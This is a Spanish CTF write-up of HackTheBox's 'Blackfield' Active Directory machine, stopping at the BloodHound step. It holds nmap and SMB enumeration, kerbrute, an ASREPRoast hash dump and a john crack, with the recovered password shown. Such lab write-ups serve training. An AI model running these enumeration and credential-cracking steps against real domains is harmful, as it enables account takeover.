---
title: Blackfield
date: 2024-10-03 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Windows
tags:
  - SMB Enumeration
  - Kerberos User Enumeration (Kerbrute)
  - ASRepRoast Attack (GetNPUsers)
  - BloodHound Enumeration
  - Abusing ForceChangePassword Privilege (net rpc)
  - Lsass Dump Analysis (Pypykatz)
  - Abusing WinRM
  - SeBackupPrivilege Exploitation
  - DiskShadow
  - Robocopy Usage
  - NTDS Credentials Extraction (secretsdump)
image:
  path: /assets/img/Blackfield/Blackfield.png
---

## Skills

- SMB Enumeration
- Kerberos User Enumeration (Kerbrute)
- ASRepRoast Attack (GetNPUsers)
- BloodHound Enumeration
- Abusing ForceChangePassword Privilege (net rpc)
- Lsass Dump Analysis (Pypykatz)
- Abusing WinRM
- SeBackupPrivilege Exploitation
- DiskShadow
- Robocopy Usage
- NTDS Credentials Extraction (secretsdump)
  
## Certificaciones

- OSCP
- OSEP
- eCPPTv3
  
## Descripción

`Backfield` es una máquina `hard windows` que presenta errores de configuración en `Windows` y `Active Directory`. Se utiliza el acceso `anónimo/invitado` a un recurso compartido de `SMB` para enumerar `usuarios`. Una vez que se encuentra un usuario con la `preautenticación de Kerberos` deshabilitada, esto nos permite realizar un ataque `ASREPRoasting`. Este ataque nos permite recuperar un `hash` del material encriptado contenido en el `AS-REP`, el cual puede ser sometido a un ataque de `fuerza bruta offline` para obtener la `contraseña` en texto plano. Con este `usuario`, podemos acceder a un recurso compartido de `SMB` que contiene artefactos `forenses`, incluido un volcado del proceso `lsass`. Este volcado contiene un `nombre de usuario` y una `contraseña` para un usuario con privilegios de `WinRM`, quien también es miembro del grupo de `Backup Operators`. Los privilegios conferidos por este `grupo privilegiado` se utilizan para extraer la `base de datos de Active Directory` y recuperar el `hash` del `administrador de dominio principal`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping -c 3 10.129.229.17
PING 10.129.229.17 (10.129.229.17) 56(84) bytes of data.
64 bytes from 10.129.229.17: icmp_seq=1 ttl=127 time=39.2 ms
64 bytes from 10.129.229.17: icmp_seq=2 ttl=127 time=37.0 ms
64 bytes from 10.129.229.17: icmp_seq=3 ttl=127 time=38.2 ms

--- 10.129.229.17 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 36.974/38.107/39.177/0.900 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.229.17 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 20:12 CEST
Initiating SYN Stealth Scan at 20:12
Scanning 10.129.229.17 [65535 ports]
Discovered open port 53/tcp on 10.129.229.17
Discovered open port 445/tcp on 10.129.229.17
Discovered open port 135/tcp on 10.129.229.17
Discovered open port 5985/tcp on 10.129.229.17
Discovered open port 88/tcp on 10.129.229.17
Discovered open port 593/tcp on 10.129.229.17
Discovered open port 3268/tcp on 10.129.229.17
Discovered open port 389/tcp on 10.129.229.17
Completed SYN Stealth Scan at 20:12, 26.36s elapsed (65535 total ports)
Nmap scan report for 10.129.229.17
Host is up (0.045s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds
           Raw packets sent: 131080 (5.768MB) | Rcvd: 29 (1.396KB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 53,88,135,389,445,593,3268,5985 10.129.229.17 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 20:15 CEST
Nmap scan report for 10.129.229.17
Host is up (0.10s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-06 01:15:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-06T01:15:25
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.13 seconds
```

### Smb Enumeration

`Obtenemos` el `nombre` de la `máquina` y el `dominio`

```
# netexec smb 10.129.229.17                                              
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```

Los añadimos al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       kali-linux
10.129.153.116  DC01 BLACKFIELD.local DC01.BLACKFIELD.local

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

`Listamos` recursos compartidos por `smb`

```
# netexec smb 10.129.229.17 -u 'guest' -p '' --shares 
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest: 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share 
```

Nos `conectamos` con `smbclient` a `profiles$` y obtenemos un `listado` de `nombres` de `usuario`

```
# smbclient --no-pass //10.129.229.17/profiles$          

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun  3 18:47:12 2020
  ..                                  D        0  Wed Jun  3 18:47:12 2020
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020
  AChampken                           D        0  Wed Jun  3 18:47:11 2020
  ACheretei                           D        0  Wed Jun  3 18:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 18:47:11 2020
  AHigchens                           D        0  Wed Jun  3 18:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 18:47:11 2020
  AKlado                              D        0  Wed Jun  3 18:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 18:47:11 2020
  AKollolli                           D        0  Wed Jun  3 18:47:11 2020
  AKruppe                             D        0  Wed Jun  3 18:47:11 2020
  AKubale                             D        0  Wed Jun  3 18:47:11 2020
  ALamerz                             D        0  Wed Jun  3 18:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 18:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 18:47:11 2020
  ANavay                              D        0  Wed Jun  3 18:47:11 2020
  ANesterova                          D        0  Wed Jun  3 18:47:11 2020
  ANeusse                             D        0  Wed Jun  3 18:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 18:47:11 2020
  APustulka                           D        0  Wed Jun  3 18:47:11 2020
  ARotella                            D        0  Wed Jun  3 18:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 18:47:11 2020
  AShadaia                            D        0  Wed Jun  3 18:47:11 2020
  ASischo                             D        0  Wed Jun  3 18:47:11 2020
  ASpruce                             D        0  Wed Jun  3 18:47:11 2020
  ATakach                             D        0  Wed Jun  3 18:47:11 2020
  ATaueg                              D        0  Wed Jun  3 18:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 18:47:11 2020
  audit2020                           D        0  Wed Jun  3 18:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 18:47:11 2020
  AWorsey                             D        0  Wed Jun  3 18:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 18:47:11 2020
  BBakajza                            D        0  Wed Jun  3 18:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 18:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 18:47:11 2020
  BConsultant                         D        0  Wed Jun  3 18:47:11 2020
  BErdossy                            D        0  Wed Jun  3 18:47:11 2020
  BGeminski                           D        0  Wed Jun  3 18:47:11 2020
  BLostal                             D        0  Wed Jun  3 18:47:11 2020
  BMannise                            D        0  Wed Jun  3 18:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 18:47:11 2020
  BRigiero                            D        0  Wed Jun  3 18:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 18:47:11 2020
  BZandonella                         D        0  Wed Jun  3 18:47:11 2020
  CAcherman                           D        0  Wed Jun  3 18:47:12 2020
  CAkbari                             D        0  Wed Jun  3 18:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 18:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 18:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 18:47:12 2020
  CGronk                              D        0  Wed Jun  3 18:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 18:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 18:47:12 2020
  CHoytal                             D        0  Wed Jun  3 18:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 18:47:12 2020
  CKolbo                              D        0  Wed Jun  3 18:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 18:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 18:47:11 2020
  CSchandall                          D        0  Wed Jun  3 18:47:12 2020
  CSelters                            D        0  Wed Jun  3 18:47:12 2020
  CTolmie                             D        0  Wed Jun  3 18:47:12 2020
  DCecere                             D        0  Wed Jun  3 18:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 18:47:12 2020
  DCwilich                            D        0  Wed Jun  3 18:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 18:47:12 2020
  DKemesies                           D        0  Wed Jun  3 18:47:12 2020
  DMatuka                             D        0  Wed Jun  3 18:47:12 2020
  DMedeme                             D        0  Wed Jun  3 18:47:12 2020
  DMeherek                            D        0  Wed Jun  3 18:47:12 2020
  DMetych                             D        0  Wed Jun  3 18:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 18:47:12 2020
  DPriporov                           D        0  Wed Jun  3 18:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 18:47:12 2020
  DVellela                            D        0  Wed Jun  3 18:47:12 2020
  DVogleson                           D        0  Wed Jun  3 18:47:12 2020
  DZwinak                             D        0  Wed Jun  3 18:47:12 2020
  EBoley                              D        0  Wed Jun  3 18:47:12 2020
  EEulau                              D        0  Wed Jun  3 18:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 18:47:12 2020
  EFrixione                           D        0  Wed Jun  3 18:47:12 2020
  EJenorik                            D        0  Wed Jun  3 18:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 18:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 18:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 18:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 18:47:12 2020
  EPryar                              D        0  Wed Jun  3 18:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 18:47:12 2020
  ESariotti                           D        0  Wed Jun  3 18:47:12 2020
  ETurgano                            D        0  Wed Jun  3 18:47:12 2020
  EWojtila                            D        0  Wed Jun  3 18:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 18:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 18:47:12 2020
  FBroj                               D        0  Wed Jun  3 18:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 18:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 18:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 18:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 18:47:12 2020
  FPflum                              D        0  Wed Jun  3 18:47:12 2020
  FReffey                             D        0  Wed Jun  3 18:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 18:47:12 2020
  Gareld                              D        0  Wed Jun  3 18:47:12 2020
  GBatowski                           D        0  Wed Jun  3 18:47:12 2020
  GForshalger                         D        0  Wed Jun  3 18:47:12 2020
  GGomane                             D        0  Wed Jun  3 18:47:12 2020
  GHisek                              D        0  Wed Jun  3 18:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 18:47:12 2020
  GMerewether                         D        0  Wed Jun  3 18:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 18:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 18:47:12 2020
  GWiegard                            D        0  Wed Jun  3 18:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 18:47:12 2020
  HColantino                          D        0  Wed Jun  3 18:47:12 2020
  HConforto                           D        0  Wed Jun  3 18:47:12 2020
  HCunnally                           D        0  Wed Jun  3 18:47:12 2020
  HGougen                             D        0  Wed Jun  3 18:47:12 2020
  HKostova                            D        0  Wed Jun  3 18:47:12 2020
  IChristijr                          D        0  Wed Jun  3 18:47:12 2020
  IKoledo                             D        0  Wed Jun  3 18:47:12 2020
  IKotecky                            D        0  Wed Jun  3 18:47:12 2020
  ISantosi                            D        0  Wed Jun  3 18:47:12 2020
  JAngvall                            D        0  Wed Jun  3 18:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 18:47:12 2020
  JDanten                             D        0  Wed Jun  3 18:47:12 2020
  JDjouka                             D        0  Wed Jun  3 18:47:12 2020
  JKondziola                          D        0  Wed Jun  3 18:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 18:47:12 2020
  JLuthner                            D        0  Wed Jun  3 18:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 18:47:12 2020
  JPistachio                          D        0  Wed Jun  3 18:47:12 2020
  JScima                              D        0  Wed Jun  3 18:47:12 2020
  JSebaali                            D        0  Wed Jun  3 18:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 18:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 18:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 18:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 18:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 18:47:12 2020
  KCockeril                           D        0  Wed Jun  3 18:47:12 2020
  KColtart                            D        0  Wed Jun  3 18:47:12 2020
  KCyster                             D        0  Wed Jun  3 18:47:12 2020
  KDorney                             D        0  Wed Jun  3 18:47:12 2020
  KKoesno                             D        0  Wed Jun  3 18:47:12 2020
  KLangfur                            D        0  Wed Jun  3 18:47:12 2020
  KMahalik                            D        0  Wed Jun  3 18:47:12 2020
  KMasloch                            D        0  Wed Jun  3 18:47:12 2020
  KMibach                             D        0  Wed Jun  3 18:47:12 2020
  KParvankova                         D        0  Wed Jun  3 18:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 18:47:12 2020
  KRasmor                             D        0  Wed Jun  3 18:47:12 2020
  KShievitz                           D        0  Wed Jun  3 18:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 18:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 18:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 18:47:12 2020
  KZyballa                            D        0  Wed Jun  3 18:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 18:47:12 2020
  LBaligand                           D        0  Wed Jun  3 18:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 18:47:12 2020
  LBirer                              D        0  Wed Jun  3 18:47:12 2020
  LBobelis                            D        0  Wed Jun  3 18:47:12 2020
  LChippel                            D        0  Wed Jun  3 18:47:12 2020
  LChoffin                            D        0  Wed Jun  3 18:47:12 2020
  LCominelli                          D        0  Wed Jun  3 18:47:12 2020
  LDruge                              D        0  Wed Jun  3 18:47:12 2020
  LEzepek                             D        0  Wed Jun  3 18:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 18:47:12 2020
  LKarabag                            D        0  Wed Jun  3 18:47:12 2020
  LKirousis                           D        0  Wed Jun  3 18:47:12 2020
  LKnade                              D        0  Wed Jun  3 18:47:12 2020
  LKrioua                             D        0  Wed Jun  3 18:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 18:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 18:47:12 2020
  LMichoud                            D        0  Wed Jun  3 18:47:12 2020
  LTindall                            D        0  Wed Jun  3 18:47:12 2020
  LYturbe                             D        0  Wed Jun  3 18:47:12 2020
  MArcynski                           D        0  Wed Jun  3 18:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 18:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 18:47:12 2020
  MBrambini                           D        0  Wed Jun  3 18:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 18:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 18:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 18:47:12 2020
  MKillberg                           D        0  Wed Jun  3 18:47:12 2020
  MLapesh                             D        0  Wed Jun  3 18:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 18:47:12 2020
  MMerezio                            D        0  Wed Jun  3 18:47:12 2020
  MNaciri                             D        0  Wed Jun  3 18:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 18:47:12 2020
  MSichkar                            D        0  Wed Jun  3 18:47:12 2020
  MTemko                              D        0  Wed Jun  3 18:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 18:47:12 2020
  MTonuri                             D        0  Wed Jun  3 18:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 18:47:12 2020
  NBellibas                           D        0  Wed Jun  3 18:47:12 2020
  NDikoka                             D        0  Wed Jun  3 18:47:12 2020
  NGenevro                            D        0  Wed Jun  3 18:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 18:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 18:47:12 2020
  NPulido                             D        0  Wed Jun  3 18:47:12 2020
  NRonges                             D        0  Wed Jun  3 18:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 18:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 18:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 18:47:12 2020
  OBushey                             D        0  Wed Jun  3 18:47:12 2020
  OHardybala                          D        0  Wed Jun  3 18:47:12 2020
  OLunas                              D        0  Wed Jun  3 18:47:12 2020
  ORbabka                             D        0  Wed Jun  3 18:47:12 2020
  PBourrat                            D        0  Wed Jun  3 18:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 18:47:12 2020
  PBranti                             D        0  Wed Jun  3 18:47:12 2020
  PCapperella                         D        0  Wed Jun  3 18:47:12 2020
  PCurtz                              D        0  Wed Jun  3 18:47:12 2020
  PDoreste                            D        0  Wed Jun  3 18:47:12 2020
  PGegnas                             D        0  Wed Jun  3 18:47:12 2020
  PMasulla                            D        0  Wed Jun  3 18:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 18:47:12 2020
  PParakat                            D        0  Wed Jun  3 18:47:12 2020
  PProvencer                          D        0  Wed Jun  3 18:47:12 2020
  PTesik                              D        0  Wed Jun  3 18:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 18:47:12 2020
  PVirding                            D        0  Wed Jun  3 18:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 18:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 18:47:12 2020
  RBochare                            D        0  Wed Jun  3 18:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 18:47:12 2020
  RNemnich                            D        0  Wed Jun  3 18:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 18:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 18:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 18:47:12 2020
  RVallandas                          D        0  Wed Jun  3 18:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 18:47:12 2020
  RWissor                             D        0  Wed Jun  3 18:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 18:47:12 2020
  SAjowi                              D        0  Wed Jun  3 18:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 18:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 18:47:12 2020
  SBouzane                            D        0  Wed Jun  3 18:47:12 2020
  SChatin                             D        0  Wed Jun  3 18:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 18:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 18:47:12 2020
  SEulert                             D        0  Wed Jun  3 18:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 18:47:12 2020
  SGolds                              D        0  Wed Jun  3 18:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 18:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 18:47:12 2020
  SHauht                              D        0  Wed Jun  3 18:47:12 2020
  SHederian                           D        0  Wed Jun  3 18:47:12 2020
  SHelregel                           D        0  Wed Jun  3 18:47:12 2020
  SKrulig                             D        0  Wed Jun  3 18:47:12 2020
  SLewrie                             D        0  Wed Jun  3 18:47:12 2020
  SMaskil                             D        0  Wed Jun  3 18:47:12 2020
  Smocker                             D        0  Wed Jun  3 18:47:12 2020
  SMoyta                              D        0  Wed Jun  3 18:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 18:47:12 2020
  SReppond                            D        0  Wed Jun  3 18:47:12 2020
  SSicliano                           D        0  Wed Jun  3 18:47:12 2020
  SSilex                              D        0  Wed Jun  3 18:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 18:47:12 2020
  STousignaut                         D        0  Wed Jun  3 18:47:12 2020
  support                             D        0  Wed Jun  3 18:47:12 2020
  svc_backup                          D        0  Wed Jun  3 18:47:12 2020
  SWhyte                              D        0  Wed Jun  3 18:47:12 2020
  SWynigear                           D        0  Wed Jun  3 18:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 18:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 18:47:12 2020
  TCaffo                              D        0  Wed Jun  3 18:47:12 2020
  TCassalom                           D        0  Wed Jun  3 18:47:12 2020
  TEiselt                             D        0  Wed Jun  3 18:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 18:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 18:47:12 2020
  TKauten                             D        0  Wed Jun  3 18:47:12 2020
  TKnupke                             D        0  Wed Jun  3 18:47:12 2020
  TLintlop                            D        0  Wed Jun  3 18:47:12 2020
  TMusselli                           D        0  Wed Jun  3 18:47:12 2020
  TOust                               D        0  Wed Jun  3 18:47:12 2020
  TSlupka                             D        0  Wed Jun  3 18:47:12 2020
  TStausland                          D        0  Wed Jun  3 18:47:12 2020
  TZumpella                           D        0  Wed Jun  3 18:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 18:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 18:47:12 2020
  UPyrke                              D        0  Wed Jun  3 18:47:12 2020
  VBublavy                            D        0  Wed Jun  3 18:47:12 2020
  VButziger                           D        0  Wed Jun  3 18:47:12 2020
  VFuscca                             D        0  Wed Jun  3 18:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 18:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 18:47:12 2020
  VMarija                             D        0  Wed Jun  3 18:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 18:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 18:47:12 2020
  WSaldat                             D        0  Wed Jun  3 18:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 18:47:12 2020
  WZelazny                            D        0  Wed Jun  3 18:47:12 2020
  XBemelen                            D        0  Wed Jun  3 18:47:12 2020
  XDadant                             D        0  Wed Jun  3 18:47:12 2020
  XDebes                              D        0  Wed Jun  3 18:47:12 2020
  XKonegni                            D        0  Wed Jun  3 18:47:12 2020
  XRykiel                             D        0  Wed Jun  3 18:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 18:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 18:47:12 2020
  YKivlen                             D        0  Wed Jun  3 18:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 18:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 18:47:12 2020
  YPredestin                          D        0  Wed Jun  3 18:47:12 2020
  YSeturino                           D        0  Wed Jun  3 18:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 18:47:12 2020
  YVonebers                           D        0  Wed Jun  3 18:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 18:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 18:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 18:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 18:47:12 2020
  ZMiick                              D        0  Wed Jun  3 18:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 18:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 18:47:12 2020
  ZWausik                             D        0  Wed Jun  3 18:47:12 2020

		5102079 blocks of size 4096. 1693094 blocks available
```

### Kerberos Enumeration

`Enumeramos usuarios` válidos usando el listado de usuarios obtenidos anteriormente

```
# kerbrute userenum --dc 10.129.153.116 -d BLACKFIELD.local users -t 50              

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/05/24 - Ronnie Flathers @ropnop

2024/10/05 22:27:52 >  Using KDC(s):
2024/10/05 22:27:52 >  	10.129.153.116:88

2024/10/05 22:27:57 >  [+] VALID USERNAME:	audit2020@BLACKFIELD.local
2024/10/05 22:28:23 >  [+] VALID USERNAME:	svc_backup@BLACKFIELD.local
2024/10/05 22:28:23 >  [+] VALID USERNAME:	support@BLACKFIELD.local
2024/10/05 22:28:28 >  Done! Tested 314 usernames (3 valid) in 35.749 seconds
```

Efectuamos un `ASREPRoast Attack` usando el listado de usuarios válidos y `obtenemos` un `hash` debido a que el usuario `support` tiene el `DONT_REQUIRE_PREAUTH` seteado

```
# impacket-GetNPUsers BLACKFIELD.Local/ -usersfile validated_domain_users
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:f603e5cdfe6e4be6e892c0c6d8c4e31c$4cf63f7f7de2cc8b8c771897b98ff36249bfd9ebb79549a0af522440ccc1cd1aaf1f91c7c972cbfe947a555a51d6deaad919a3fcfba52b1f154eb0e221f17c1d4e5afa4abe23fbb8da6aa376041d891ee3eabde45613da4fbdd5f1d82dd87db80e8cd0ca4708b68e65084b5cab0a53513c5f5af8a9d7937962f4afe1ec909ba40c9fbf43fcf3dc5d0122347ec56fc3488eb659ed85b614d14c118215804c8e08565d35b5dbc79c819bb8e567b73cc16f14a6cb9ae24e7e5de5bef6c56a2c9f8120766f61919acd7dba87099d866b729f714c2cefe9e52d20f5f8367b81be69c685b461e45c8623291d7f10b88a5fd2afe30f5b0e
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`Metemos` el `hash` del `usuario` en un `archivo` y lo `crackeamos` con `john`

```
# john -w:/usr/share/wordlists/rockyou.txt hash  
Created directory: /home/justice-reaper/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:14 DONE (2024-10-05 22:31) 0.07142g/s 1023Kp/s 1023Kc/s 1023KC/s #1WIF3Y.."theodore"
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Intrusión

Con `bloodhound-python` podemos `listar información` de la máquina víctima sin necesidad de conectarnos

```
# bloodhound-python -c All -u 'support' -p '#00^BlackKnight' -ns 10.129.153.116 -d BLACKFIELD.Local -v --zip 
```

Ejecutamos `neo4j` para proceder a una `enumeración` más `profunda` del `directorio activo`

```
